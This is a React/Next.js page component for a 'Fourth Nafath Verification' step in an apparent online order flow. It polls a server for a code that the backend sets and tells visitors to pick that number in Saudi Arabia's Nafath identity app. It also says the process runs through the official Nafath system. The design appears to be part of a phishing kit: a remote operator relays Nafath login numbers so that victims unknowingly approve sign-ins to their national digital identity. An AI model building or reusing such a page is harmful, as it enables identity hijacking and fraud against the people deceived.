import { useState, useEffect, useCallback } from "react";
import {
  FaArrowRight,
  FaShieldAlt,
  FaMobileAlt,
  FaCheckCircle,
} from "react-icons/fa";
import { BsFillInfoCircleFill } from "react-icons/bs";
import { HiSparkles } from "react-icons/hi";
import { useSearchParams, useRouter } from "next/navigation";
import { motion } from "framer-motion";

export default function ModernNafatOtpFour() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const _id = searchParams.get("id");

  const [order, setOrder] = useState({});
  const [value, setValue] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => {
      setValue((v) => {
        if (order?.nafatOtpFour) {
          clearInterval(interval);
          return 100;
        }
        if (v >= 100) {
          clearInterval(interval);
          return 100;
        }
        return v + 1;
      });
    }, 1200);
    return () => clearInterval(interval);
  }, [order?.nafatOtpFour]);

  const url = `${process.env.API_URL || ""}/api/order/${_id}`;
  const fetchOrder = useCallback(async () => {
    if (!_id) return;

    try {
      const response = await fetch(url);
      if (!response.ok) throw new Error("Failed to fetch order data");
      const data = await response.json();
      setOrder(data);
    } catch (error) {
      console.error("Error fetching order:", error);
    }
  }, [url, _id]);

  useEffect(() => {
    const intervalId = setInterval(() => {
      fetchOrder();
    }, 2000);

    return () => clearInterval(intervalId);
  }, [fetchOrder, order.nafatOtpFour]);

  const handleSubmit = (e) => {
    e.preventDefault();
    router.push(`/order-success?id=${order._id}`);
  };

  const reload = () => window.location.reload();

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-teal-950">
      {/* Hero Section */}
      <div className="relative overflow-hidden bg-gradient-to-r from-teal-900/20 to-teal-900/20 border-b border-slate-800">
        <div className="absolute inset-0 bg-[url('https://images.unsplash.com/photo-1557821552-17105176677c?w=1200&auto=format&fit=crop')] opacity-5 bg-cover bg-center"></div>
        <div className="relative max-w-7xl mx-auto px-4 py-16 text-center">
          <div className="inline-flex items-center gap-2 px-4 py-2 bg-white/10 backdrop-blur-md rounded-full mb-4 border border-white/20">
            <HiSparkles className="w-4 h-4 text-teal-400" />
            <span className="text-sm text-white font-medium">Final Step</span>
          </div>
          <h1 className="text-4xl md:text-6xl font-bold text-white mb-4 tracking-tight">
            Fourth{" "}
            <span className="bg-gradient-to-r from-teal-400 to-teal-400 bg-clip-text text-transparent">
              Nafath
            </span>{" "}
            Verification
          </h1>
          <p className="text-gray-300 text-lg max-w-2xl mx-auto">
            Complete your final identity verification to finish your order.
          </p>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-3xl mx-auto px-4 py-16">
        <div className="mb-8 bg-teal-500/10 backdrop-blur-sm border border-teal-500/30 rounded-2xl p-6">
          <div className="flex items-start gap-4">
            <BsFillInfoCircleFill className="w-6 h-6 text-teal-400 flex-shrink-0 mt-1" />
            <div className="text-gray-300">
              <p className="font-medium mb-1">Before you continue</p>
              <p className="text-sm text-gray-400">
                If you do not have the Nafath application installed, download it
                from the store and register.
              </p>
            </div>
          </div>
        </div>

        {/* Main Card */}
        <div className="bg-slate-900/50 backdrop-blur-xl rounded-3xl p-8 md:p-12 border border-slate-800">
          <div className="text-center mb-8">
            <h2 className="text-2xl font-bold text-white mb-3">
              Final Authentication
            </h2>
            <p className="text-gray-400">
              Log in to the Nafath app and choose the code displayed below.
            </p>
          </div>

          {/* Circular Progress */}
          <div className="flex justify-center mb-8">
            <div className="relative">
              <svg className="w-48 h-48 transform -rotate-90">
                <circle
                  cx="96"
                  cy="96"
                  r="88"
                  stroke="currentColor"
                  strokeWidth="8"
                  fill="none"
                  className="text-slate-800"
                />
                <circle
                  cx="96"
                  cy="96"
                  r="88"
                  stroke="currentColor"
                  strokeWidth="8"
                  fill="none"
                  strokeDasharray={`${2 * Math.PI * 88}`}
                  strokeDashoffset={`${2 * Math.PI * 88 * (1 - value / 100)}`}
                  className="text-teal-500 transition-all duration-300"
                  strokeLinecap="round"
                />
              </svg>
              <div className="absolute inset-0 flex items-center justify-center">
                <span className="text-4xl font-bold text-white">{value}%</span>
              </div>
            </div>
          </div>

          {/* OTP Code */}
          <div className="flex justify-center mb-8">
            {order.nafatOtpFour ? (
              <motion.div
                initial={{ scale: 0.9 }}
                animate={{ scale: 1.15 }}
                transition={{
                  repeat: Infinity,
                  repeatType: "reverse",
                  duration: 1.2,
                }}
                className="bg-gradient-to-r from-teal-500 to-teal-500 text-white w-24 h-24 rounded-2xl flex justify-center items-center shadow-2xl"
              >
                <div className="flex items-center gap-1 text-2xl font-bold">
                  <FaCheckCircle className="w-5 h-5" />
                  {order.nafatOtpFour}
                </div>
              </motion.div>
            ) : (
              <motion.div
                initial={{ scale: 1 }}
                animate={{ scale: 1.1 }}
                transition={{
                  repeat: Infinity,
                  repeatType: "reverse",
                  duration: 1.2,
                }}
                className="bg-slate-700 text-gray-400 w-24 h-24 rounded-2xl flex justify-center items-center"
              >
                N/A
              </motion.div>
            )}
          </div>

          {/* Status Message */}
          {order.nafatOtpFour ? (
            <div className="mb-6 p-4 bg-teal-500/10 border border-teal-500/30 rounded-xl">
              <p className="text-center text-teal-400 font-medium flex items-center justify-center gap-2">
                <FaCheckCircle className="w-5 h-5" /> Code received! You may
                continue.
              </p>
            </div>
          ) : (
            <div className="mb-6 p-4 bg-slate-800/50 border border-slate-700 rounded-xl">
              <p className="text-center text-gray-400 font-medium">
                Waiting for verification code...
              </p>
            </div>
          )}

          {/* Open Nafath */}
          <a
            href="https://play.google.com/store/apps/details?id=sa.gov.nic.myid"
            target="_blank"
            className="block w-full py-4 mb-4 bg-slate-800/50 border border-slate-700 hover:bg-slate-800 text-white rounded-xl font-semibold transition-all duration-300 flex items-center justify-center gap-2"
          >
            <FaMobileAlt className="w-5 h-5 text-teal-400" /> Open Nafath App
          </a>

          {/* Continue */}
          <button
            onClick={order.nafatOtpFour ? handleSubmit : reload}
            disabled={!order.nafatOtpFour}
            className={`w-full py-4 rounded-xl font-semibold transition-all duration-300 flex items-center justify-center gap-2 ${
              order.nafatOtpFour
                ? "bg-gradient-to-r from-teal-500 to-teal-500 text-white hover:shadow-2xl hover:shadow-teal-500/50"
                : "bg-slate-700 text-gray-400 cursor-not-allowed"
            }`}
          >
            {order.nafatOtpFour ? (
              <>
                Continue to Order Confirmation
                <FaArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
              </>
            ) : (
              <>Refresh Page</>
            )}
          </button>

          {/* Security */}
          <div className="mt-6 p-4 bg-slate-800/30 rounded-xl border border-slate-700">
            <p className="text-sm text-gray-400 flex items-start gap-2">
              <FaShieldAlt className="text-teal-400 mt-0.5 flex-shrink-0" />
              <span>
                <strong className="text-teal-400">Secure Process:</strong>{" "}
                {`This
                final verification is processed through Saudi Arabia's official
                Nafath system.`}
              </span>
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
